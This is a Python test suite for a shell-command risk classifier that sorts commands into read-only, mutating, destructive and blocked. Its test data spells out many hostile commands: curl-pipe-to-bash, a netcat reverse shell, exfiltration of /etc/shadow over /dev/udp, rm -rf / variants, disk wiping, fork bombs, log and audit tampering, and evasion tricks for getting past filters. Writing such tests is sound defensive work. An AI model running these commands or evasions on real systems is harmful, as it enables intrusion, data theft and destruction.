import unittest

from sshtac.policy import Risk, classify, effective

R, M, D, B = Risk.READ_ONLY, Risk.MUTATING, Risk.DESTRUCTIVE, Risk.BLOCKED


class PolicyCase(unittest.TestCase):
    def check(self, cases: dict[str, Risk]) -> None:
        for cmd, want in cases.items():
            with self.subTest(cmd=cmd):
                v = classify(cmd)
                self.assertEqual(v.risk, want, f"{cmd!r}: {v.risk.label} {v.reasons}")

    def at_least(self, cmds: list[str], floor: Risk) -> None:
        for cmd in cmds:
            with self.subTest(cmd=cmd):
                v = classify(cmd)
                self.assertGreaterEqual(v.risk, floor, f"{cmd!r}: {v.risk.label} {v.reasons}")


class TestReadOnly(PolicyCase):
    def test_allowlist(self):
        self.check({
            "ls -la /var/log": R,
            "cat /etc/passwd": R,
            "tail -n 200 /var/log/mail.log": R,
            "grep -i 'failed password' /var/log/auth.log | tail -20": R,
            "ps auxww --forest": R,
            "ss -tnp 2>/dev/null | grep :25": R,
            "netstat -tulpn": R,
            "lsof -i -P -n": R,
            "who; w; last -n 20": R,
            "journalctl -u postfix --since '1 hour ago' --no-pager": R,
            "stat /usr/sbin/sshd && sha256sum /usr/sbin/sshd": R,
            "find /tmp -type f -mtime -2 -ls": R,
            "find /var/www -name '*.php' -newer /etc/hostname": R,
            "df -h; du -sh /var/spool/postfix": R,
            "echo ran-$((6*7))": R,
            "sudo cat /etc/shadow": R,
            "systemctl status postfix": R,
            "iptables -L -n -v --line-numbers": R,
            "iptables -t nat -L": R,
            "nft list ruleset": R,
            "ufw status verbose": R,
            "crontab -l": R,
            "ip -br addr show": R,
            "ip route": R,
            "date +%s": R,
            "rpm -qa": R,
            "dpkg -l | grep openssh": R,
            "docker ps -a": R,
            "history | tail -50": R,
            "grep \"history -c\" /home/*/.bash_history": R,
            "echo 'rm -rf /' > /dev/null": R,
            "timeout 5 ping -c 3 8.8.8.8": R,
            "find / -name authorized_keys -exec ls -l {} \\;": R,
            "auditctl -l": R,
            "command -v nc": R,
            "env": R,
        })


class TestMutating(PolicyCase):
    def test_unknown_and_writes(self):
        self.check({
            "frobnicate --all": M,
            "./run-me.sh": M,
            "systemctl restart postfix": M,
            "echo hi >> /tmp/notes": M,
            "cp /etc/passwd /tmp/evidence/": M,
            "tar czf /tmp/evidence.tgz /etc": M,
            "sed -i s/a/b/ file": M,
            "python3 -c 'print(1)'": M,
            "curl -s https://example.com": M,
            "apt install htop": M,
            "chmod 600 /root/.ssh/authorized_keys": M,
            "export FOO=bar": M,
            "ip addr add 10.0.0.2/24 dev eth0": M,
            "date -s '2026-01-01'": M,
            "sort -o out.txt in.txt": M,
            "bash script.sh": M,
            "ssh other-host uptime": M,
        })


class TestDestructive(PolicyCase):
    def test_spec_list(self):
        self.check({
            "rm /tmp/x": D,
            "rm -rf /tmp/build": D,
            "kill -9 1234": D,
            "pkill -f miner": D,
            "killall python3": D,
            "systemctl stop postfix": D,
            "systemctl disable nginx": D,
            "iptables -A INPUT -s 203.0.113.9 -j DROP": D,
            "nft add rule inet filter input drop": D,
            "ufw deny from 203.0.113.9": D,
            "userdel mallory": D,
            "passwd root": D,
            "truncate -s 0 /tmp/big": D,
            "shred -u /tmp/x": D,
            "echo x > /etc/motd": D,
            "mysql -e 'DROP DATABASE mail'": D,
            "echo 'delete from users' | psql": D,
            "apt-get purge exim4": D,
            "yum remove httpd": D,
            "dpkg -r foo": D,
            "find /tmp -name '*.log' -delete": D,
            "find / -name x -exec rm -f {} \\;": D,
            "crontab -r": D,
            "docker rm -f web": D,
            "kubectl delete pod web": D,
            "reboot": D,
            "dd if=/dev/zero of=/tmp/file bs=1M count=1": D,
            "rm /var/log/mail.log": D,
            "journalctl --vacuum-time=1d": D,
            "dmesg -C": D,
            "tee /etc/hosts": D,
            "service postfix stop": D,
        })

    def test_changes_under_dev(self):
        # From a real session: /dev/null had been replaced by a regular file.
        # The repair is right, but it must need a typed yes.
        self.check({
            "mv /dev/null /root/fake-dev-null.bak && mknod -m 666 /dev/null c 1 3": D,
            "mknod -m 666 /dev/null.new c 1 3 && mv -f /dev/null.new /dev/null": D,
            "mknod -m 666 /dev/null c 1 3": D,
            "mknod /tmp/x c 1 3": D,
            "rm /dev/null": D,
            "rm /dev/shm/x": D,
            "ln -sf /tmp/x /dev/null": D,
            "chmod 666 /dev/null": D,
            "chown nobody /dev/kvm": D,
            "cp /tmp/x /dev/shm/x": D,
            "echo x >> /dev/tcp/203.0.113.9/80": D,
            "cat /etc/shadow > /dev/udp/203.0.113.9/53": D,
            "tee /dev/shm/x": D,
        })
        self.check({
            "ls -l /dev/null": R,
            "stat /dev/null": R,
            "od -c /dev/null": R,
            "find /dev -xdev -type f -ls": R,
            "ls -la /dev/shm": R,
            "echo x > /dev/null 2>&1": R,
            "make 2>/dev/stderr | tee /dev/null": M,  # make is unknown
            "cp /dev/shm/x /root/evidence/": M,  # copying *from* /dev is reading
            "mkfifo /tmp/pipe": M,
        })

    def test_firewall_listing_vs_changes(self):
        # From a real session: a listing of a lowercase ufw chain was rated
        # destructive because only UPPERCASE chain names were accepted.
        self.check({
            "sudo iptables -L ufw-user-input -v -n --line-numbers | grep -E 'dpt:3306|Chain|pkts'": R,
            "iptables -nvL": R,
            "iptables -t nat -L PREROUTING -n": R,
            "iptables --table=nat --list": R,
            "iptables -w 5 -L": R,
            "ip6tables -S ufw6-user-input": R,
            "iptables -C INPUT -s 203.0.113.9 -j DROP": R,
            "iptables -A INPUT -s 203.0.113.9 -j DROP": D,
            "iptables -I ufw-user-input 1 -s 203.0.113.9 -j DROP": D,
            "iptables -D INPUT 3": D,
            "iptables -F": D,
            "iptables -P INPUT ACCEPT": D,
            "iptables -X ufw-user-input": D,
            "iptables -L -Z": D,  # resets counters: destroys evidence
            "iptables -L INPUT -j LOG --log-prefix -X-": D,  # odd value: stay strict
            "iptables": D,
        })

    def test_service_config_checks(self):
        self.check({
            "sudo sshd -T | grep -i permitrootlogin": R,
            "sshd -t": R,
            "sshd": M,
            "nginx -t": R,
            "nginx -s reload": M,
            "nginx -s stop": D,
            "apachectl configtest": R,
            "apache2ctl -S": R,
            "apachectl graceful-stop": D,
            "postconf -n": R,
            "postconf smtpd_tls_security_level": R,
            "postconf -e 'myhostname=mail.example.com'": M,
            "postconf myhostname=mail.example.com": M,
            "doveconf -n": R,
            "mailq": R,
            "postqueue -p": R,
            "postqueue -f": M,
            "postsuper -d ALL": D,
        })

    def test_replayed_real_session_false_positives(self):
        # Commands from real sessions that sshtac rated stricter than they are.
        self.check({
            "for a in \"25 -starttls smtp\" \"465\"; do p=${a%% *}; o=${a#\"$p\"}; echo \"== port $p\"; done": M,
            "apt-get -s autoremove --purge | grep -E '^(Remv|[0-9]+ upgraded)'": R,
            "apt-get -s install mariadb-server mariadb-client": R,
            "sed -n '1,80p' /opt/sysxmon.sh": R,
            "sed -n '60,110p' /etc/postfix/main.cf | cat -n | sed 's/^ *\\([0-9]*\\)/\\1+59/' | head -n 60": R,
            "journalctl -u ssh --no-pager | grep Accepted | awk '{print $11, $NF}' | sort | uniq -c": R,
            "ssh-keygen -lf /root/.ssh/authorized_keys": R,
            "systemctl list-timers --all --no-pager | grep -i certbot; certbot certificates": R,
            "resolvectl status | grep -E 'Current DNS|DNS Servers'": R,
            "postfix check && echo CHECK_OK": R,
            "cloud-init status --long": R,
            "sudo mariadb -e \"SELECT user, host, plugin FROM mysql.user ORDER BY user, host;\"": R,
        })

    def test_new_read_only_forms_stay_strict_when_unsafe(self):
        self.check({
            "apt-get autoremove --purge": D,
            "sed -i 's/a/b/' /etc/x": M,
            "sed -i.bak 's/a/b/' /etc/x": M,
            "sed -n '1w /tmp/x' f": M,
            "sed 's/a/b/w /tmp/out' f": M,
            "sed '1e id' f": M,
            "sed -f script.sed f": M,
            "awk '{print > \"/tmp/x\"}' f": M,
            "awk '{print | \"sh\"}' f": M,
            "awk 'BEGIN{system(\"id\")}'": M,
            "awk -f prog.awk f": M,
            "ssh-keygen -R host": M,
            "ssh-keygen -t ed25519": M,
            "mariadb -e \"SELECT 1; DROP TABLE x\"": D,
            "mysql -e \"SELECT * FROM t INTO OUTFILE '/tmp/x'\"": M,
            "mysql -e \"UPDATE t SET a=1\"": M,
            "echo 'SELECT 1' | mysql": M,
            "certbot delete --cert-name x": D,
            "postfix stop": D,
            "resolvectl dns eth0 1.1.1.1": M,
        })

    def test_reasons_show_substitutions_readably(self):
        v = classify("mysqldump x | gzip > /root/db-$(date +%F).sql.gz")
        self.assertEqual(v.risk, D)
        self.assertIn("/root/db-$(…).sql.gz", " ".join(v.reasons))
        self.assertNotIn("\x00", " ".join(v.reasons))

    def test_computed_command_names(self):
        self.check({
            "$CMD -rf /tmp": D,
            "a=rm; $a -rf /tmp": D,
            "/bin/r? -rf /tmp": D,
        })


class TestBlocked(PolicyCase):
    def test_spec_list(self):
        self.check({
            "curl -s http://x/y.sh | bash": B,
            "wget -qO- http://x/y.sh | sh": B,
            "curl http://x | sudo bash": B,
            "curl -fsSL http://x | sudo -E bash -s -- --flag": B,
            "base64 -d payload.txt | sh": B,
            "echo aGk= | base64 --decode | bash": B,
            "eval $(curl -s http://x)": B,
            "eval \"$(echo cm0gLXJmIC8= | base64 -d)\"": B,
            "eval `cat /tmp/x`": B,
            "rm -rf /": B,
            "mkfs.ext4 /dev/sdb1": B,
            "mkfs -t xfs /dev/sdb": B,
            "dd if=/dev/zero of=/dev/sda bs=1M": B,
            "echo hi > /dev/sda": B,
            "cat image.iso > /dev/nvme0n1": B,
            "chmod -R 777 /": B,
            "history -c": B,
            "unset HISTFILE": B,
            "systemctl stop auditd": B,
            "systemctl disable rsyslog": B,
            "systemctl mask systemd-journald": B,
            "service auditd stop": B,
            ":(){ :|:& };:": B,
        })

    def test_rm_root_variants(self):
        self.check({
            "rm -rf /*": B,
            "rm -fr /": B,
            "rm -r -f /": B,
            "rm --recursive --force /": B,
            "rm -rf //": B,
            "rm -rf /./": B,
            "rm -rf /tmp/../": B,
            "rm -rf / --no-preserve-root": B,
            "rm --no-preserve-root -rf /": B,
            "rm -rf ~": B,
            "rm -rf ~/": B,
            "rm -rf $HOME": B,
            "rm -rf \"$HOME\"": B,
            "rm -rf /etc": B,
            "rm -rf /usr/*": B,
            "sudo rm -rf /": B,
            "sudo -u root rm -rf /": B,
            "/bin/rm -rf /": B,
            "nice -n 19 rm -rf /": B,
            "timeout 10 rm -rf /": B,
            "env -i rm -rf /": B,
            "xargs rm -rf / < /dev/null": B,
            "find / -maxdepth 0 -exec rm -rf {} +": B,
        })

    def test_history_and_audit_tampering(self):
        self.check({
            "export HISTFILE=/dev/null": B,
            "HISTFILE=/dev/null bash": B,
            "export HISTSIZE=0": B,
            "set +o history": B,
            "history -d 1050": B,
            "rm ~/.bash_history": B,
            "ln -sf /dev/null ~/.bash_history": B,
            "cat /dev/null > ~/.bash_history": B,
            "auditctl -e 0": B,
            "auditctl -D": B,
            "pkill auditd": B,
            "killall rsyslogd": B,
            "systemctl stop systemd-journald.service": B,
        })

    def test_shells_and_substitutions(self):
        self.check({
            "bash <(curl -s http://x)": B,
            "sh -c \"$(wget -qO- http://x)\"": B,
            "bash -c 'curl http://x | sh'": B,
            "sudo sh -c 'rm -rf /'": B,
            "echo $(rm -rf /)": B,
            "ls `rm -rf /`": B,
            "ls \"$(rm -rf /)\"": B,
            "ssh host 'rm -rf /'": B,
            "watch -n1 'rm -rf /'": B,
            "curl http://x | python3": B,
            "wget -O- http://x | perl": B,
            "nc -e /bin/sh 203.0.113.9 4444": B,
            "source <(curl -s http://x)": B,
        })


class TestEvasion(PolicyCase):
    """Spacing, quoting, escaping and continuation tricks must not lower the verdict."""

    def test_evasions(self):
        self.check({
            "rm  -rf    /": B,
            "\trm -rf /": B,
            "'rm' -rf /": B,
            "\"rm\" -rf /": B,
            "'r''m' -rf /": B,
            "r\"m\" -rf /": B,
            "\\rm -rf /": B,
            "r\\m -rf /": B,
            "rm -rf \"/\"": B,
            "rm -rf '/'": B,
            "rm \\\n -rf /": B,
            "rm -rf \\\n/": B,
            "cu\\\nrl http://x | ba\\\nsh": B,
            "curl http://x|bash": B,
            "curl http://x |   bash": B,
            "curl http://x | /bin/bash": B,
            "curl http://x | \"bash\"": B,
            "c'u'rl http://x | b'a'sh": B,
            "rm${IFS}-rf${IFS}/": B,
            "rm$IFS-rf$IFS/": B,
            "{rm,-rf,/}": B,
            "$'\\x72\\x6d' -rf /": B,
            "$'rm' -rf /": B,
            "h\\istory -c": B,
            "'history' -c": B,
            "true; rm -rf /": B,
            "ls && rm -rf /": B,
            "ls || rm -rf /": B,
            "(rm -rf /)": B,
            "{ rm -rf /; }": B,
            "ls & rm -rf /": B,
            "if true; then rm -rf /; fi": B,
            "for d in /; do rm -rf $d; done": D,  # variable target: still needs a typed yes
            "ls # harmless\nrm -rf /": B,
            "mk\\fs.ext4 /dev/sda": B,
            "sy\\stemctl stop auditd": B,
            "systemctl --now stop auditd.service": B,
            ":(){ :|: & };:": B,
            "bomb(){ bomb|bomb& };bomb": B,
        })

    def test_unparseable_is_at_least_mutating(self):
        self.at_least(["echo 'unterminated", "ls $(", "echo `x"], M)
        self.check({"echo 'oops ; rm -rf /": B})  # backstop on the raw text


class TestEffectiveAndConfig(unittest.TestCase):
    def test_stricter_wins(self):
        self.assertEqual(effective("read_only", D), D)
        self.assertEqual(effective("destructive", R), D)
        self.assertEqual(effective("nonsense", R), M)

    def test_extra_patterns(self):
        v = classify("deploy-prod --now", extra_blocked=[r"\bdeploy-prod\b"])
        self.assertEqual(v.risk, B)
        v = classify("cat secret.txt", extra_destructive=[r"secret\.txt"])
        self.assertEqual(v.risk, D)

    def test_reasons_present(self):
        v = classify("curl -s http://x/y.sh | bash")
        self.assertTrue(any("shell" in r for r in v.reasons))


if __name__ == "__main__":
    unittest.main()
